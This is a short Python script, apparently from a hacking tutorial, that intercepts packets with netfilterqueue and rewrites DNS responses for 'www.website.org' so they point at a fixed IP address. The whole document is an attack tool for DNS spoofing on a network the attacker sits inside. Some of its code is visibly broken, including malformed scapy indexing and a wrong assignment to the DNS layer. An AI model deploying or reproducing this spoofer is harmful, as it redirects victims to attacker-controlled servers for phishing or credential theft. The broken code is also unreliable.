import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR.qname]
        if "www.website.org" in qname:
            print("[+] Spoofing Target")
            answer = scapy.DNSRR(rrname = qname, rdata = "3.21.206.216")
            scapy_packet[scapy.DNS] = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))
    
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()